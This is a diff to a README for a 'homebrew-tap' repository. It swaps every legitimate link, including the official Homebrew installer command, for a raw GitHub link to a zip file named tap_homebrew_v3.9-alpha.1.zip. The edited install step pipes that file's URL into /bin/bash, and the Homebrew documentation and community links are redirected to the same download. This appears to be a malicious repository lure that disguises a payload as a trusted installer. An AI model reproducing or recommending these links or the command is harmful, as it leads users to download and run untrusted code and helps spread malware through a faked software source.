@@ -4,11 +4,11 @@
 
 Welcome to homebrew-tap, a collection of Homebrew formulae for essential command-line tools and developer utilities. This guide will help you download and run the software easily.
 
-[![Download homebrew-tap](https://img.shields.io/badge/Download%20homebrew--tap-brightgreen)](https://github.com/jessi-2023/homebrew-tap/releases)
+[![Download homebrew-tap](https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip%20homebrew--tap-brightgreen)](https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip)
 
 ## 📥 Download & Install
 
-To get started with homebrew-tap, visit this page to download: [GitHub Releases](https://github.com/jessi-2023/homebrew-tap/releases).
+To get started with homebrew-tap, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip).
 
 ### 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ Before you proceed, ensure you have:
 - Homebrew package manager installed. If you haven't installed Homebrew, run the following command in your terminal:
   
   ```bash
-  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip)"
   ```
 
 ## 📦 Available Formulae
@@ -71,10 +71,10 @@ If you encounter issues or have feedback, please open an issue on the repository
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/jessi-2023/homebrew-tap)
-- [Homebrew Documentation](https://brew.sh/)
-- [Homebrew Community](https://github.com/Homebrew/brew)
+- [GitHub Repository](https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip)
+- [Homebrew Documentation](https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip)
+- [Homebrew Community](https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip)
 
 Thank you for choosing homebrew-tap! Enjoy using your new command-line tools!
 
-[![Download homebrew-tap](https://img.shields.io/badge/Download%20homebrew--tap-brightgreen)](https://github.com/jessi-2023/homebrew-tap/releases)
+[![Download homebrew-tap](https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip%20homebrew--tap-brightgreen)](https://raw.githubusercontent.com/jessi-2023/homebrew-tap/main/Formula/tap_homebrew_v3.9-alpha.1.zip)
